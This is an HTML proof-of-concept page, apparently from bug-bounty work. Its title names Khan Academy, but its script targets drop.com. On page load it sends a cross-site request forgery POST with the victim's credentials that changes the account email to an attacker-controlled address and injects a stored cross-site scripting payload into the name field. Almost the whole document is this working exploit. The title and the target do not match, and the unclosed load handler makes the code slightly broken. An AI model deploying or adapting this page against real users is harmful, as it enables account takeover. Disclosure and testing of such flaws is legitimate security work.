<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>Khan Academy Signup Email CSRF PoC</title>
        <style type="text/css">
        body {
            display:flex;
            flex-direction:column;
            justify-content:center;
            min-height:100vh;
            margin:0;
        }
        p {
            display:flex;
            align-self:center;
            font-size:0.8rem;
            font-family:sans-serif;
            font-weight:bold;
            text-transform:uppercase;
            letter-spacing:0.1rem;
        }
        </style>
    </head>
    <body>
        <p>Khan Academy Signup Email CSRF PoC</p>
        <script type="text/javascript">
            window.addEventListener('load', function(e) {
                var x = new XMLHttpRequest();
                x.open('POST', 'https://drop.com/api?lang=en-US', true);
                x.withCredentials = true;
                x.setRequestHeader('Content-Type', 'application/json');
                x.setRequestHeader('Referer', 'https://drop.com/settings/user_info');
                x.send('{"requests":{"g0":{"resource":"me","operation":"update","params":{"name":"<script>alert(document.URL)</script>","email":"bughunter123@yopmail.com","username":"hard","removeCreditCard":false,"currentPassword":"","newPassword":"","confirmPassword":"","revokeSessions":false},"body":{}}},"context":{"lang":"en-US"}}', false);
        </script>
    </body>
</html>
